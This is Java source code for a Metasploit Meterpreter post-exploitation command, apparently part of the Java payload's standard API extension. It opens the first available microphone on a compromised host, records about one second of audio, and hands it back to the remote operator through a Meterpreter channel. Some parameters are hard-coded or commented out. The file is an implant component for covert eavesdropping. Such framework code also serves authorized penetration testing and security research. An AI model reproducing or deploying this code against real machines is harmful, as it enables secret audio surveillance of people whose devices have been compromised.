package com.metasploit.meterpreter.stdapi;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Line;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.Mixer;
import javax.sound.sampled.TargetDataLine;
import javax.sound.sampled.Mixer.Info;

import com.metasploit.meterpreter.Channel;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.command.NotYetImplementedCommand;
import com.sun.media.sound.WaveFileWriter;

@SuppressWarnings("restriction")
public class channel_create_stdapi_net_mic_broadcast_V1_4 implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
//        String fpath = request.getStringValue(TLVType.TLV_TYPE_FILE_PATH);
//        String mode = request.getStringValue(TLVType.TLV_TYPE_FILE_MODE, "rb");
        Channel channel;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        channel = new Channel(meterpreter, new ByteArrayInputStream(new byte[0]), baos);
        streamAudio(baos);
        response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        return ERROR_SUCCESS;
    }
    
    private void streamAudio(ByteArrayOutputStream baos) throws LineUnavailableException, IOException{
    	int duration = 1;
    	//int duration = request.getIntValue(TLV_TYPE_AUDIO_DURATION);
        TargetDataLine line = null;
        Info[] mixerInfo = AudioSystem.getMixerInfo();
        for (int i = 0; i < mixerInfo.length; i++) {
            Mixer mixer = AudioSystem.getMixer(mixerInfo[i]);
            Line.Info[] targetLineInfo = mixer.getTargetLineInfo();
            if (targetLineInfo.length > 0) {
                line = (TargetDataLine) mixer.getLine(targetLineInfo[0]);
                break;
            }
        }
        if (line == null)
            throw new UnsupportedOperationException("No recording device found");
        AudioFormat af = new AudioFormat(11000, 8, 1, true, false);
        line.open(af);
        line.start();
        byte[] buf = new byte[(int) af.getSampleRate() * af.getFrameSize()];
        long end = System.currentTimeMillis() + 1000 * duration;
        int len;
        while (System.currentTimeMillis() < end && ((len = line.read(buf, 0, buf.length)) != -1)) {
            baos.write(buf, 0, len);
        }
        line.stop();
        line.close();
        //baos.close();
//        AudioInputStream ais = new AudioInputStream(new ByteArrayInputStream(baos.toByteArray()), af, baos.toByteArray().length);
//        ByteArrayOutputStream wavos = new ByteArrayOutputStream();
//        new WaveFileWriter().write(ais, AudioFileFormat.Type.WAVE, wavos);
    }
}
